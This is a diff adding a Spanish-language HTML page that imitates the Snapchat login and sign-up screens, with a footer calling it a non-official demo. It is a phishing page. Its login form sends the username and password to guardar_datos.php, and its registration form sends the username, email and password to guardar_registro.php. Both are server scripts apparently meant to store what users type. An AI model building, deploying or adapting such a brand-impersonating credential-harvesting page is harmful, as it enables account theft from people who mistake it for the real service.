@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Iniciar sesión en Snapchat</title>
+
+    <style>
+      /* Reset simple */
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        margin: 0;
+        font-family: "Helvetica Neue", Arial, sans-serif;
+        background-color: #f6f7f8;
+        color: #222;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+
+      .page-wrap {
+        max-width: 760px;
+        margin: 30px auto 0;
+        padding: 0 20px;
+      }
+
+      /* Login container más pequeño */
+      .login-container {
+        background-color: #fff;
+        padding: 24px;
+        border-radius: 8px;
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
+        width: 100%;
+        max-width: 360px; /* reducido para parecer más compacto */
+        text-align: center;
+        margin: 0 auto 18px;
+      }
+      .login-container img {
+        width: 80px;
+        height: 80px;
+        object-fit: cover;
+        margin-bottom: 10px;
+      }
+      .login-container h2 {
+        margin: 6px 0 16px;
+        font-size: 22px;
+        color: #111;
+      }
+      .login-container input[type="text"],
+      .login-container input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        margin: 8px 0;
+        border: 1px solid #e0e0e0;
+        border-radius: 6px;
+        font-size: 14px;
+      }
+      .login-container a.inline {
+        color: #007aff;
+        text-decoration: none;
+        display: block;
+        margin: 6px 0 12px;
+        font-size: 14px;
+      }
+      .login-container button {
+        width: 100%;
+        padding: 10px;
+        background-color: #00c1ff;
+        border: none;
+        border-radius: 24px;
+        cursor: pointer;
+        font-size: 15px;
+        color: #fff;
+        font-weight: 700;
+        margin-top: 6px;
+      }
+
+      .first-time {
+        text-align: center;
+        margin: 12px 0 24px;
+        font-size: 14px;
+      }
+      .first-time a {
+        color: #111;
+        text-decoration: none;
+        font-weight: 600;
+        margin-left: 6px;
+      }
+
+      .info-block {
+        width: 100%;
+        max-width: 1100px;
+        margin: 12px auto 0;
+        padding: 28px 20px;
+        display: flex;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        background: #fafbfc;
+        border-radius: 6px;
+      }
+      .info-col {
+        min-width: 200px;
+        margin-bottom: 16px;
+      }
+      .info-col strong {
+        display: block;
+        margin-bottom: 10px;
+        font-weight: 700;
+      }
+      .info-col a {
+        display: block;
+        text-decoration: none;
+        color: #333;
+        margin-bottom: 6px;
+        font-size: 14px;
+      }
+
+      .language-row {
+        width: 100%;
+        text-align: left;
+        max-width: 1100px;
+        margin: 18px auto 0;
+        padding: 0 20px 10px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        font-size: 14px;
+      }
+      select#idioma {
+        padding: 8px 10px;
+        border-radius: 6px;
+        border: 1px solid #ddd;
+        background: white;
+        font-size: 14px;
+      }
+
+      .lower-links {
+        width: 100%;
+        text-align: center;
+        margin: 18px 0 0;
+        padding: 16px 20px 40px;
+        font-size: 14px;
+        color: #222;
+      }
+      .lower-links a {
+        text-decoration: none;
+        color: #222;
+        margin: 0 12px;
+      }
+
+      .register-container {
+        background-color: #fff;
+        padding: 24px;
+        border-radius: 8px;
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
+        width: 100%;
+        max-width: 360px;
+        text-align: center;
+        margin: 30px auto;
+        display: none;
+      }
+      .register-container input[type="text"],
+      .register-container input[type="email"],
+      .register-container input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        margin: 8px 0;
+        border: 1px solid #e0e0e0;
+        border-radius: 6px;
+        font-size: 14px;
+      }
+      .register-container button {
+        width: 100%;
+        padding: 10px;
+        background-color: #00c1ff;
+        border: none;
+        border-radius: 24px;
+        font-weight: 700;
+        color: #fff;
+        cursor: pointer;
+        margin-top: 6px;
+      }
+      .register-actions {
+        margin-top: 12px;
+        font-size: 14px;
+      }
+      .register-actions a {
+        color: #007aff;
+        text-decoration: none;
+      }
+
+      .site-footer {
+        background: #222;
+        color: #fff;
+        padding: 14px 20px;
+        text-align: center;
+        font-size: 13px;
+      }
+
+      @media (max-width: 720px) {
+        .info-block {
+          padding: 18px 12px;
+        }
+        .page-wrap {
+          padding: 0 14px;
+        }
+        .login-container,
+        .register-container {
+          padding: 20px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="page-wrap">
+      <div class="login-container" id="loginCard">
+        <img src="Captura2.JPG" alt="Snapchat Logo" />
+        <h2>Iniciar sesión en Snapchat</h2>
+
+        <form action="guardar_datos.php" method="post">
+          <input
+            type="text"
+            name="usuario"
+            placeholder="Nombre de usuario o dirección de email"
+            required
+          />
+          <a class="inline" href="#">Usa tu número de teléfono en su lugar</a>
+
+          <input
+            type="password"
+            name="contraseña"
+            placeholder="Contraseña"
+            required
+          />
+          <button type="submit">Siguiente</button>
+        </form>
+
+        <a class="inline" href="#">¿Olvidaste tu contraseña?</a>
+      </div>
+
+      <div class="first-time">
+        ¿Es la primera vez que usas Snapchat?
+        <a href="#" onclick="mostrarRegistro(); return false;">Registrarse</a>
+      </div>
+    </div>
+
+    <div class="register-container" id="registro">
+      <img src="Captura2.JPG" alt="Snapchat Logo" />
+      <h2>Crear una cuenta</h2>
+
+      <form
+        action="guardar_registro.php"
+        method="post"
+        onsubmit="return validarRegistro();"
+      >
+        <input
+          type="text"
+          name="usuario"
+          id="reg_usuario"
+          placeholder="Nombre de usuario"
+          required
+        />
+        <input
+          type="email"
+          name="correo"
+          id="reg_correo"
+          placeholder="Correo electrónico"
+          required
+        />
+        <input
+          type="password"
+          name="password"
+          id="reg_password"
+          placeholder="Contraseña"
+          required
+        />
+        <input
+          type="password"
+          name="confirmar"
+          id="reg_confirmar"
+          placeholder="Confirmar contraseña"
+          required
+        />
+        <button type="submit">Registrarse</button>
+      </form>
+
+      <div class="register-actions">
+        ¿Ya tienes una cuenta?
+        <a href="#" onclick="ocultarRegistro(); return false;"
+          >Iniciar sesión</a
+        >
+      </div>
+    </div>
+
+    <div
+      class="info-block"
+      role="contentinfo"
+      aria-label="Enlaces informativos"
+    >
+      <div class="info-col">
+        <strong>Empresa</strong>
+        <a href="#">Snap Inc.</a>
+        <a href="#">Carreras</a>
+        <a href="#">Noticias</a>
+      </div>
+      <div class="info-col">
+        <strong>Comunidad</strong>
+        <a href="#">Ayuda</a>
+        <a href="#">Pautas para la comunidad</a>
+        <a href="#">Centro de seguridad</a>
+      </div>
+      <div class="info-col">
+        <strong>Publicidad</strong>
+        <a href="#">Comprar anuncios</a>
+        <a href="#">Políticas de publicidad</a>
+        <a href="#">Biblioteca de anuncios de carácter político</a>
+        <a href="#">Pautas de la marca</a>
+        <a href="#">Reglas de promociones</a>
+      </div>
+      <div class="info-col">
+        <strong>Legal</strong>
+        <a href="#">Centro de privacidad</a>
+        <a href="#">Tus opciones de privacidad</a>
+        <a href="#">Política de cookies</a>
+        <a href="#">Denunciar una infracción</a>
+        <a href="#">Condiciones de herramientas creativas</a>
+        <a href="#">Condiciones de Geofiltros</a>
+        <a href="#">Condiciones de Lens Studio</a>
+      </div>
+    </div>
+
+    <div class="language-row" aria-label="Selector de idioma">
+      <label for="idioma">Idioma</label>
+      <select id="idioma" onchange="cambiarIdioma();">
+        <option value="es-es">Español (España)</option>
+        <option value="es-mx">Español (México)</option>
+        <option value="en-us">English (US)</option>
+        <option value="en-gb">English (UK)</option>
+      </select>
+    </div>
+
+    <div class="lower-links" role="navigation">
+      <a href="#">Política de privacidad</a>
+      <a href="#">Condiciones de servicio</a>
+    </div>
+
+    <div class="site-footer">
+      © 2025 Demo - No es el sitio oficial de Snapchat. Recursos y enlaces son
+      de ejemplo.
+    </div>
+
+    <script>
+      function mostrarRegistro() {
+        var r = document.getElementById("registro");
+        var l = document.getElementById("loginCard");
+        r.style.display = "block";
+        if (l) l.style.display = "none";
+        setTimeout(function () {
+          r.scrollIntoView({ behavior: "smooth", block: "center" });
+        }, 50);
+      }
+      function ocultarRegistro() {
+        var r = document.getElementById("registro");
+        var l = document.getElementById("loginCard");
+        r.style.display = "none";
+        if (l) l.style.display = "block";
+        if (l) l.scrollIntoView({ behavior: "smooth", block: "center" });
+      }
+      function validarRegistro() {
+        var p = document.getElementById("reg_password").value;
+        var c = document.getElementById("reg_confirmar").value;
+        if (p !== c) {
+          alert("Las contraseñas no coinciden.");
+          return false;
+        }
+        return true;
+      }
+      function cambiarIdioma() {
+        var sel = document.getElementById("idioma");
+        console.log("Idioma seleccionado:", sel.value);
+      }
+    </script>
+  </body>
+</html>
